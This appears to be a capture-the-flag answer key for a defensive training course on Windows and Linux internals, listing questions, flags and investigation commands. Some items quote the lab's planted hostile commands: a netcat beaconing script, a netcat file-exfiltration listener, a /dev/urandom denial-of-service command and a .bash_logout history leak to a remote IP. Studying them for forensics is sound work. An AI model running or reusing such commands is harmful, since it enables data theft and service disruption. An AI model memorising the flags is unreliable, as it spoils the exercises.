5: Windows includes 4 critical Kernel-mode components. Which component is a matched pair with the kernel and obfuscates the hardware dependencies from the kernel? - ``` HAL ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Windows includes 4 critical Kernel-mode components. Which component directs calls from a user-mode process to the kernel services? - ``` Executive ```
______________________________________________________________________________________________________________________________________________________________________________________
7: This provides an operating system with a software interface to a hardware device. - ``` Driver ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What are the two firmware interfaces supported by modern computers and read in the Pre-boot phase of the Windows boot process? - ``` UEFI and BIOS ```
______________________________________________________________________________________________________________________________________________________________________________________
9: What is the name of the process that spawns SYSTEM? - ``` ntoskrnl.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
10: In Windows what does the boot sector code load into memory? - ``` bootmgr and winload.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
11: In Windows 10 what is the name of the boot manager? - ``` bootmgr ```
______________________________________________________________________________________________________________________________________________________________________________________
12: In Microsoft Vista and later the boot.ini file was replaced by what? - ``` BCD ```
______________________________________________________________________________________________________________________________________________________________________________________
13: What is the tamper-resistant processor mounted on the motherboard used to improve the security of your PC. It's used by services like BitLocker drive encryption and Windows Hello to securely create and store cryptographic keys, and to confirm that the operating system and firmware on your device are what they're supposed to be, and haven't been tampered with. - ``` TPM ```
______________________________________________________________________________________________________________________________________________________________________________________
14: During the Windows boot process, what starts BOOT_START device drivers and services with value of 0x0 in the registry key HKLM\SYSTEM\CurrentControlSet\Services? - ``` Winload.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
15: During the Windows boot process, what starts SYSTEM_START device drivers and services with hex value of 0x1 in the registry key HKLM\SYSTEM\CurrentControlSet\Services? - ``` Ntoskrnl.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
16: During the Windows boot process, services.exe starts device drivers and services on demand with what hex value in the registry key HKLM\SYSTEM\CurrentControlSet\Services? - ``` 0x2 ```
______________________________________________________________________________________________________________________________________________________________________________________
17: Starting in Windows Vista, what process spawns two additional instances (with identical names), used to initiate session 0 and session 1? - ``` smss.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
18: Which Windows Vista user session is non-interactive, contains system services and processes and is isolated from the GDI (Graphical Device Interface). - ``` Session 0 ```
______________________________________________________________________________________________________________________________________________________________________________________
19: What is the boot process security feature available in UEFI systems, that only allows verified drivers to load? - ``` Secure Boot ```
______________________________________________________________________________________________________________________________________________________________________________________
20: To make booting faster, starting with Windows 8, the OS does a partial ________ of the kernel session at shutdown? - ``` Hibernation ```
______________________________________________________________________________________________________________________________________________________________________________________
21: What registry key is responsible for starting services on your machine during the boot process? Flag is the full registry path. - ``` HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNSERVICES ```
______________________________________________________________________________________________________________________________________________________________________________________
22: When a user logs on to a Windows host, authentication will either grant the user access to the local computer only (Local Logon) or the user will also be granted access to a Windows domain (Domain Logon). Which logon will the user be authenticated to via the Security Accounts Manager (SAM) database? - ``` Local Logon ```
______________________________________________________________________________________________________________________________________________________________________________________
23: What is the parent process of explorer.exe? - ``` userinit.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
24: What is responsible for handling Windows SAS (secure attention sequence), user profile loading, assignment of security to user shell, and Windows station and desktop protection? - ``` winlogon.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
25: What critical Windows process is initialized by wininit.exe, is responsible for creating the user's security access token and verifying user logon credentials? - ``` lsass.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
26: What Microsoft recovery option overwrites the registry key HKLM\System\Select after every successful logon? - ``` Last known good configuration ```
______________________________________________________________________________________________________________________________________________________________________________________
27: What authentication protocol is the default for logging onto an Active Directory domain and features SSO (Single-Sign On), mutual authentication and primarily uses symmetric cryptography? - ``` Kerberos ```
______________________________________________________________________________________________________________________________________________________________________________________
28: In Kerberos the Active Directory controller serves as which major Kerberos component consisting of the Authentication Service (AS) and the Ticket Granting Service (TGS). - ``` Key Distribution Center ```
______________________________________________________________________________________________________________________________________________________________________________________
29: When would the following Windows registry keys, actions occur? HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify - ``` Logon ```
______________________________________________________________________________________________________________________________________________________________________________________
## Primer_Kernel_1-5 *
1: The Windows NT Operating System attempts to combine features and benefits of microkernel and monolithic kernel architectures, making it which type of kernel architecture? - ``` Hybrid ```
______________________________________________________________________________________________________________________________________________________________________________________
2: The Linux kernel is an example of what type of kernel architecture? - ``` Monolithic ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Windows operating system name typically differs from its version number. Which Windows version includes Windows 7 and Windows Server 2008R2 and was the 1st version to ship with PowerShell? - ``` 6.1 ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Which Windows version includes Windows Server 2016, 2019, 2022, Windows 10 & 11 and includes SMB 3.1.1 support? - ``` 10 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: The CMD.EXE tool systeminfo included in Windows is very similar to msinfo32 and displays operating system configuration version information for a local or remote machine, including service pack levels. - ``` systeminfo | findstr /C:"OS Version" /C:"BIOS Version" ```

Craft a systeminfo command that only returns the below info:

OS Version: "System OS and Build #"

BIOS Version: "Your BIOS Ver"
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Boot_INIT_1-12 *
1: What is the first process to spawn on Windows systems after the kernel loads? - ``` System ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the Process ID (PID) of the first Windows process? - ``` 4 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the second boot process to spawn, that then spawns csrss in both session 0 and session 1? - ``` smss ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What session ID do Windows services operate in? - ``` 0 ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What process creates access tokens? - ``` lsass ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What is the parent process to all svchosts? - ``` services ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What process is waiting with high priority for the Secure Attention Sequence (SAS)? - ``` winlogon ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What user space process spawns explorer, then dies? - ``` userinit ```
______________________________________________________________________________________________________________________________________________________________________________________
9: What is the name of the bootloader, with extension, we are using on all of the Windows machines in this environment? - ``` winload.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
10: Based on the boot loader from Init_9, which firmware are we using (BIOS or UEFI) in our environment? - ``` BIOS ```
______________________________________________________________________________________________________________________________________________________________________________________
11: What file saves the memory state to the hard drive when going into hibernation? - ``` hiberfil.sys ```
______________________________________________________________________________________________________________________________________________________________________________________
12: What bootloader is responsible for restoring the system to its original state after hibernation? - ``` winresume.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Boot_Remediate_1-5 *
1: The system is booting into safe mode. Identify the flag from the command-line output of the command used to diagnose boot issues. - ``` 1RF5Zgf9P ```

        bcdedit
______________________________________________________________________________________________________________________________________________________________________________________
2: The system is booting into safe mode. Correct that, and reboot into the desktop. The flag is on the desktop. - ``` 76Drp6hB ```

        bcdedit /deletevalue {default} safeboot
        shutdown /r
        shutdown -a    #run until it aborts the shutdown
______________________________________________________________________________________________________________________________________________________________________________________
3: Prevent the system restart using the command line, and then identify persistence mechanisms that are reverting the OS and boot loader configurations. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Run PowerShell... if you can. Resolve PowerShell dependencies. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Once you fix and launch PowerShell, the console is changed to a custom layout. Figure out what file is causing this, read the file, and inspect the file that it is referencing. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 08_Linux_Boot_Process
## Linux_Boot_Hex_1 *
1: Solve the following equation: 0x31A - 0x21B. Enter the flag in Hexadecimal form. - ``` 0xFF ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_Bits_And_Bytes_1-3 *
1: How many bits are in a nibble, and a byte? - ``` 4,8 ```
______________________________________________________________________________________________________________________________________________________________________________________
2: How many bits does a single Hexadecimal character represent? - ``` 4 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Each hex pair contains a value of 8 bits when used to represent memory. The range from 0x00000000 to 0x00000010 in hexadecimal represents addresses in memory or positions in data. This range includes the starting address (0x00000000) and ends at the address (0x00000010). How many bytes could the range 0x00000000 - 0x00000010 contain? - ``` 17 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_MBR_1 *
1: How large is the Master Boot Record and what directory is it located in? - ``` 512,/dev/ ```

        $ lsblk
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_SysV_1 *
1: Identify which of your Linux machines is using SysV Initialization. - ``` Minas_Tirith ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_Hex_2-4 *
2: What are the maximum and minimum value a single Hexadecimal digit can contain? - ``` 0x0-0xF ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What are the maximum and minimum values, in decimal notation, that a single Hexadecimal digit can represent? - ``` 0-15 ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Solve the following equation: 0x31A + 0x43. Enter the flag in Hexadecimal form. - ``` 0x35D ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_Bits_And_Bytes_4 *
4: What are the values contained in hex positions 0x00000001 through 0x00000008? - ``` 63,90,8e,d0,31,e4,8e,d8 ```

        $ sudo cat /dev/vda | xxd -l 32 -c 0x10 -g 1
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_MBR_2-5 *
2: Locate the master boot record for one of the Linux machines and read it with xxd. What programming language is the MBR written in? - ``` Assembly Language ```
______________________________________________________________________________________________________________________________________________________________________________________
3: The file /home/bombadil/mbroken is a copy of an MBR from another machine. Hash the first partition of the file using md5sum. The flag is the hash. - ``` 2a5948fad4ec68170b23faaa2a16cef8 ```

        $ xxd -l 120 -ps -c 20 xxd.1
        $ dd -ibs 16 
        $ dd bs=1 skip==446 count=16 if=mbroken of=linuxsucks
        $ md5sum linuxsucks
______________________________________________________________________________________________________________________________________________________________________________________
4: The file /home/bombadil/mbroken is a copy of an MBR from another machine. You will find the "word" GRUB in the output, hash using md5sum. The flag is the entire hash. - ``` 5fa690cb0f0789cbc57decfd096a503e ```

        $ dd bs=1 skip=392 count=4 if=mmbroken of=linuxsucks
        $ md5sum linuxsucks
______________________________________________________________________________________________________________________________________________________________________________________
5: The file /home/bombadil/mbroken is a copy of an MBR from another machine. Hash only the Bootstrap section of the MBR using md5sum. The flag is the entire hash. - ``` d59a68c7b6d62ecaa1376dfb73a3b7be ```

        $ dd if=/home/bombadil/mbroken bs=1 count=446 | md5sum
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_SysV_2-4 *
2: Identify the default run level on the SysV Init Linux machine. - ``` 2 ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What is the last script to run when the command init 6 is executed? - ``` /etc/init.d/reboot ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What run levels start the daemon that allows remote connections over port 22? - ``` 2,3,4,5 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_SystemD_1-6 *
1: Identify the file that init is symbolically-linked to, on the SystemD init machine. - ``` /lib/systemd/systemd ```

        # either located in /lib/systemd/systemd/ or /etc/systemd/systemd/
        $ ls -l /etc/systemd/systemd
        $ ls -l /lib/systemd/systemd
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the default target on the SystemD machine and where is it actually located? - ``` graphical.target,/lib/systemd/system/graphical.target ```

        $ systemctl get-default
        $ find / -name graphical.target
______________________________________________________________________________________________________________________________________________________________________________________
3: What unit does the graphical.target want to start, based solely on its configuration file? - ``` display-manager.service ```

        $ cat /lib/systemd/system/graphical.target
        # Wants=display-manager.service
______________________________________________________________________________________________________________________________________________________________________________________
4: What dependency to graphical.target will stop it from executing if it fails to start, based solely on its static configuration file? - ``` multi-user.target ```

        $ cat /lib/systemd/system/graphical.target
        # Requires=multi-user.target
______________________________________________________________________________________________________________________________________________________________________________________
5: How many wants dependencies does SystemD actually recognize for the default.target - ``` 7 ```

        $ cat /lib/systemd/system/graphical.target
        # Wants the total lines/fields below
                 [Unit]
        1        Description=Graphical Interface
        2        Documentation=man:systemd.special(7)
        3        Requires=multi-user.target
        4        Wants=display-manager.service
        5        Conflicts=rescue.service rescue.target
        6        After=multi-user.target rescue.service rescue.target display-manager.service    
        7        AllowIsolate=yes

______________________________________________________________________________________________________________________________________________________________________________________
6: What is the full path to the binary used for standard message logging? - ``` /usr/sbin/rsyslogd ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Boot_GRUB *
Identify the Linux Kernel being loaded by the Grub, by examining its configuration. Enter the command used by the Grub, and the full path to the Kernel, as the flag. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 09_Windows_Process_Validity
## Primer_Processes_1-12 *
1: What is the full path to folder used when Windows redirects 32 bit applications running on a 64bit system? - ``` C:\Windows\SysWOW64 ```

        reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList'
        Primer_Process(1) 
______________________________________________________________________________________________________________________________________________________________________________________
2: What Windows System Service starts the kernel and user mode subsystems? - ``` smss.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What Windows system process: - ``` lsass.exe ```

Runs in session 0

is responsible for enforcing the security policy on the system

Performs all logon functions

Handles password changes

Creates access tokens

Writes to the Windows Security Log
______________________________________________________________________________________________________________________________________________________________________________________
4: Which is spoolsv.exe? - ``` Server-mode Service ```
______________________________________________________________________________________________________________________________________________________________________________________
5: Which service type is explorer.exe? - ``` User-mode Service ```
______________________________________________________________________________________________________________________________________________________________________________________
6: During a network survey you observed a host running inetinfo.exe service. What type of server might you have found? - ``` IIS ```
______________________________________________________________________________________________________________________________________________________________________________________
7: During a reconnaissance mission you enumerated a host running the dns.exe service. Is this a user pc or a server? - ``` Server ```
______________________________________________________________________________________________________________________________________________________________________________________
8: A host running firefox and office 365 is most likely what type of host? Server or Client - ``` Client ```
______________________________________________________________________________________________________________________________________________________________________________________
9: How does a User-Mode Service request resources? - ``` System Call ```
______________________________________________________________________________________________________________________________________________________________________________________
10: Passively copying currently running processes for comparison later is known as? - ``` Baselining ```
______________________________________________________________________________________________________________________________________________________________________________________
11: What can execute any part of a processes code, to include parts already being executed? - ``` Thread ```
______________________________________________________________________________________________________________________________________________________________________________________
12: Windows has how many process priority levels? - ``` 32 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Processes_Basics_1-10 *
1: What Sysinternals tool shows malware persistence locations in tabs within its GUI? - ``` Autoruns ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What Sysinternals tool is used to investigate processes? - ``` Process Explorer ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What Sysinternals tool can be used to investigate network connection attempts? - ``` TCPView ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What Sysinternals tool can view permissions? - ``` AccessChk ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What Sysinternals tool allows us to view and modify handles? - ``` Handle ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What is the default Windows user directory for files downloaded from the internet? The flag is the folder name only. - ``` Downloads ```
______________________________________________________________________________________________________________________________________________________________________________________
7: What is the default Windows download directory that everyone has access to? The flag is the absolute path to the directory. - ``` C:\users\public\downloads ```
______________________________________________________________________________________________________________________________________________________________________________________
8: What Sysinternals tool shows service load order? - ``` LoadOrder ```
______________________________________________________________________________________________________________________________________________________________________________________
9: What is the service name of Windows Defender Firewall? - ``` MpsSvc ```
______________________________________________________________________________________________________________________________________________________________________________________
10: What SysInternals tool reports .dlls loaded into processes? - ``` ListDLLs ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Hidden_Processes_1-6 *
1: There is malware on the system that is named similarly to a legitimate Windows executable. There is a .dll in the folder that the malware runs from. The flag is the name of the .dll. - ``` libmingwex-0.dll ```
______________________________________________________________________________________________________________________________________________________________________________________
2: You notice that there is an annoying pop up happening regularly. Investigate the process causing it. The flag is the name of the executable. - ``` McAfeeFireTray.exe ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Determine what is sending out a SYN_SENT message. The flag is the name of the executable. - ``` McAfeeFireTray.exe ```

        Get-Itemproperty 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-1584283910-3275287195-1754958050-1005'
______________________________________________________________________________________________________________________________________________________________________________________
4: Malware uses names of legit processes to obfuscate itself. Give the flag located in Kerberos’ registry subkey. - ``` 76aGreX5 ```

        # RDP using Remmina into the admin workstation, then search RDP and rdp into workstation1
        # Open Powershell and run > net use * http://live.sysinternals.com
        # After it should confirm they downloaded and see a zipped file on the desktop, extract into another file on the desktop
        # Open and find autoruns, double click, use filter to search Kerberos, right click and jump to entry, open subkey in left panel
        # Locate the sub entry that is named Flag and there is your flag
______________________________________________________________________________________________________________________________________________________________________________________
5: There is malware named TotallyLegit. Find its binary location and there will be a file in that directory. Read the file. - ``` GwlkK3sa ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Find the McAfeeFireTray.exe. There is a file in that directory. The flag is inside. - ``` StrongBad ```
______________________________________________________________________________________________________________________________________________________________________________________
## Win_Process_Situational_Awareness_1-5 *
1: What are the permissions for NT SERVICE\TrustedInstaller on spoolsv.exe? Copy the permissions from your shell. - ``` RW ```

        # Remmina to admin workstation, RDP to workstation1, run as administrator on powershell, cd into the systeminternals folder then run the command below
        # .\accesschk.exe C:\Windows\System32\spoolsv.exe
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the PATH listed in the output when we find the handle for spoolsv.exe? - ``` C:\Windows\System32\en-US\spoolsv.exe.mui ```

        # Remmina to admin workstation, RDP to workstation1, run as administrator on powershell, cd into the systeminternals folder then run the command below
        # .\handle.exe spoolsv.exe
______________________________________________________________________________________________________________________________________________________________________________________
3: In what Load Order Group is the Windows Firewall service? - ``` NetworkProvider ```

        # Remmina to admin workstation, RDP to workstation1, open systeminternals folder and find and run as administrator on procmon
        # Stop the capture after a few (10) seconds then ctrl+f and search for mpssvc, right click jump to..., scroll down and find mpssvc and select it then look for Group under the Name category.
______________________________________________________________________________________________________________________________________________________________________________________
4: What is the first .dll associated with winlogon.exe? Provide the name of the .dll only, not the /absolute/path - ``` ntdll.dll ```

        # Remmina to admin workstation, RDP to workstation1, run as administrator on powershell, cd into the systeminternals folder then run the command below
        # .\Listdlls.exe winlogon.exe
______________________________________________________________________________________________________________________________________________________________________________________
5: While examining the Windows Defender Firewall, what is the LogAllowedConnections setting set to, for the Public profile? - ``` false ```

        # run powershell as administrator, run command below
        # Get-NetFirewallProfile -Profile Public | Select-Object -Property LogAllowed
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Hidden_Processes_7-9 *
7: A nonstandard port has been opened by possible malware on the system. Identify the port. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Determine what mechanism opened the port from hidden_processes_7. The flag is the name of the file. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Identify the flag from the file in hidden_processes_8. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 10_Windows_UAC
## Windows_UAC_Basics_1-8 *
1: What Sysinternals tool will allow you to view a file's manifest? - ``` sigcheck ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What is the RequestedExecutionLevel for an application to run with the same permissions as the process that started it? - ``` asInvoker ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What RequestedExecutionLevel will prompt the user for Administrator credentials if they're not a member of the Administrator's group? - ``` requireAdministrator ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What registry key holds UAC values? - ``` HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ```
______________________________________________________________________________________________________________________________________________________________________________________
5: The flag is the RequestedExecutionLevel of the schtasks.exe file. - ``` asInvoker ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Determine which UAC subkey property shows whether UAC is enabled or not. The flag is the data value in that property. - ``` 0x1337 ```

        Reg Query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
______________________________________________________________________________________________________________________________________________________________________________________
7: Provide the name of the UAC [Registry subkey] property that determines what level UAC is set to for admin privileges (Example UAC levels: Default, Always, Notify). - ``` ConsentPromptBehaviorAdmin ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Query the registry subkey where UAC settings are stored, and provide the flag. - ``` NiceJob ```
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 11_Windows_Services
## Windows_Services_Basics_1-7 *
1: What command-line (cmd) command will show service information? - ``` sc query ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What command-line (cmd) command will show all services, running or not running? - ``` sc query type=service state=all ```
______________________________________________________________________________________________________________________________________________________________________________________
3: What PowerShell command will list all services? - ``` Get-Service ```
______________________________________________________________________________________________________________________________________________________________________________________
4: What registry location holds all service data? - ``` HKLM\System\CurrentControlSet\Services ```
______________________________________________________________________________________________________________________________________________________________________________________
5: What registry subkey holds a service's .dll location? - ``` parameters ```
______________________________________________________________________________________________________________________________________________________________________________________
6: Services have a name and display name, which could be different. What is the service name of the only Totally-Legit service? - ``` Legit ```

        get-services
        get-service Totally-Legit | Format-list *
______________________________________________________________________________________________________________________________________________________________________________________
7: Figure out the SID of the only Totally-Legit service. - ``` 1182961511 ```

        sc showsid Legit
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 12_Linux_Process_Validity
## Linux_Processes_1-9 *
1: What is the process ID (PID) of the SysV Init daemon? - ``` 1 ```
______________________________________________________________________________________________________________________________________________________________________________________
2: How many child processes did SysV Init daemon spawn? - ``` 24 ```

    $ htop
        - sort by ppid
        - count
______________________________________________________________________________________________________________________________________________________________________________________
3: Identify all of the arguments given to the ntpd daemon (service) using ps. List all options with parameters (include numbers). - ``` -p /var/run/ntpd.pid -g -u 105:109 ```

    $ ps -elf | grep ntpd
______________________________________________________________________________________________________________________________________________________________________________________
4: What is the parent process to Bombadil’s Bash process? (name of the binary, not the absolute path) - ``` sshd ```

    $ ps -elf | grep bash
        Grab the PID for the Parent Process(PPID) 
    $ ps -elf | grep <PPID>
        match IDs
______________________________________________________________________________________________________________________________________________________________________________________
5: Identify the file mapped to the fourth file descriptor (handle) of the cron process. - ``` /run/crond.pid ```

    $ sudo lsof | grep cron | sort
    $ ls -l /run/crond.pid
______________________________________________________________________________________________________________________________________________________________________________________
6: Identify the permissions that cron has on the file identified in Processes 5. - ``` r,w ```

    $ sudo lsof | grep cron | sort
    $ ls -l /run/crond.pid
______________________________________________________________________________________________________________________________________________________________________________________
7: Identify the names of the orphan processes on the SysV system. - ``` Aragorn,BruceWayne,Eowyn,Tolkien ```

    $ htop
______________________________________________________________________________________________________________________________________________________________________________________
8: Locate zombie processes on the SysV system. Identify the zombie processes' parent process. - ``` /bin/funk ```

    $ htop
______________________________________________________________________________________________________________________________________________________________________________________
9: Locate the strange open port on the SysV system. Identify the command line executable and its arguments. - ``` /bin/netcat -lp 9999 ```

    $ htop
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Process_Proc_Dir_1-2 *
1: Examine the process list to find the ssh process. Then, identify the symbolic link to the absolute path for its executable in the /proc directory. - ``` /proc/1904/exe,/usr/sbin/sshd ```

    $ ps -elf | grep sshd
    $ ls -l /proc/1904
______________________________________________________________________________________________________________________________________________________________________________________
2: Identify the file that contains udp connection information. Identify the process using port 123. - ``` ntp,17,u ```

    $ sudo lsof | grep UDP
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Processes_10 *
10: Locate the strange open port on the SysV system. Identify how the process persists between reboots. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Process_Proc_Dir_3 *
3: Identify one of the human-readable file handles by the other program that creates a zombie process. - ``` and in the darkness bind them ```
______________________________________________________________________________________________________________________________________________________________________________________
## Linux_Process_Find_Evil_1-5 *
1: Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection. Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over. - ``` Mausan ukoul for avhe mubullat goth,witch_king,127.0.0.1:1234 ```

        $ find / -name *chant* 2>/dev/null
        $ sudo cat /home/*/chant
        # Output: Mausan ukoul for avhe mubullat goth
        
        $ htop
        # to find /home/witch_king
        
        $ ls -l /home/witch_king
        $ cat /home/witch_king/camlindon
        # Output: bash script below
        #!/bin/bash
        (
        flock -n 9 || exit 1
                echo "beaconing"
        for i in $(seq 1 5); do nc -lw10 127.0.0.1 -p 1234 2>/dev/null; sleep 10; done
                echo "done beaconing"
        ) 9>/tmp/mylockfile
______________________________________________________________________________________________________________________________________________________________________________________
2: Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring. Task: Identify the command being ran and how it occurs. - ``` ??? ```
______________________________________________________________________________________________________________________________________________________________________________________
3: Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts. The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes. - ``` netcat -lp 3389 < /tmp/NMAP_all_hosts.txt,whatischaos.timer ```

        systemctl
        whatischaos.service
        ls -l /lib/systemd/system | grep chaos
        cat /lib/systemd/system/whatischaos.service
        cat /lib/systemd/system/whatischaos.timer
______________________________________________________________________________________________________________________________________________________________________________________
4: Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage. Task: Identify the Cyber Attack Method used by the group, and the command running. - ``` DOS,/bin/apache3 -lp 443 < /dev/urandom ```

        $ htop
        $ /bin/apache3 -lp 443
        $ find / -name *apache3* | grep apache3
        $ cat /lib/systemd/system/apache3.service
______________________________________________________________________________________________________________________________________________________________________________________
5: Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts can’t find any persistent connections, but notice a spike in traffic on logon and logoff. Task: Identify how the command history is stolen from the machine. - ``` /home/garviel/.bash_logout,12.54.37.8:12000 ```

        $ ls -la
        $ cat .bash_logout
______________________________________________________________________________________________________________________________________________________________________________________
# |
# |
# |
# |
# |
# 13_Windows_Auditing_And_Logging
## Primer_Auditing_1-8 *
1: Logging, Auditing and Monitoring are often confused with each other but are distinctly different. Which term refers to real-time analysis and is often accomplished with a Security Event Information Management system (SIEM)? - ``` Monitoring ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What term is most appropriate when referring to the process of reviewing log files or other records for specified period? - ``` Auditing ```
______________________________________________________________________________________________________________________________________________________________________________________
3: "Complete the following path to the Windows System Log which records system events e.g. startup and shutdown: %systemroot%\System32_______________ - ``` WinEvt\Logs\System.evtx ```
______________________________________________________________________________________________________________________________________________________________________________________
4: Which Windows log contains either success or failures and can be configured to record failed logon attempts? - ``` Security ```
______________________________________________________________________________________________________________________________________________________________________________________
5: "Which Windows account is the only account to have WRITE-APPEND access to Windows event logs?" - ``` SYSTEM ```
______________________________________________________________________________________________________________________________________________________________________________________
6: What is parsed in an NTFS object's security descriptor, by the Security Reference Monitor (SRM), to determine if an audit entry will be created in the Windows Security Log? - ``` SACL ```
______________________________________________________________________________________________________________________________________________________________________________________
7: Which registry key holds the audit policy configuration? - ``` HKLM\SECURITY\Policy\PolAdtEv ```
______________________________________________________________________________________________________________________________________________________________________________________
8: Which sysinternals tool is used to parse logs? - ``` PsLogList ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Browser_Artifacts_1 *
1: What Sysinternals tool will allow you to read the SQLite3 database containing the web history of chrome? - ``` Strings ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Recent_Files_1 *
1: What is the registry location of recent docs for the current user? - ``` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_BAM_1 *
1: BAM settings are stored in different registry locations based on the version of Windows 10. What version of Windows 10 is workstation2 running? The answer is the 4 digit Windows 10 release (version) number. - ``` 1803 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Last_Access *
Figure out the last access time of the hosts file. - ``` 08/14/2024 ```

        (Get-Item "C:\Windows\System32\drivers\etc\hosts").LastAccessTime
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Prefetch_1 *
1: What is the literal path of the prefetch directory? - ``` C:\Windows\Prefetch ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Recycle_Bin_1-2 *
1: In the Recycle Bin, there is a file that contains the actual contents of the recycled file. What are the first two characters of this filename? - ``` $R ```
______________________________________________________________________________________________________________________________________________________________________________________
2: In the Recycle Bin, there is a file that contains the original filename, path, file size, and when the file was deleted. What are the first two characters of this filename? - ``` $I ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_UserAssist_1-2 *
1: What are the first 8 characters of the Globally Unique Identifier (GUID) used to list applications found in the UserAssist registry key (Windows 7 and later)? - ``` CEBFF5CD ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What cipher method are UserAssist files encoded in? - ``` ROT13 ```
______________________________________________________________________________________________________________________________________________________________________________________
## Windows_Logs_1-3 *
1: What main Windows log would show invalid login attempts? - ``` Security ```
______________________________________________________________________________________________________________________________________________________________________________________
2: What main Windows log will show whether Windows updates were applied recently? - ``` System ```
______________________________________________________________________________________________________________________________________________________________________________________
3: When reading logs, you may notice ... at the end of the line where the message is truncated. What format-table switch/argument will display the entire output? - ``` -wrap ```
______________________________________________________________________________________________________________________________________________________________________________________
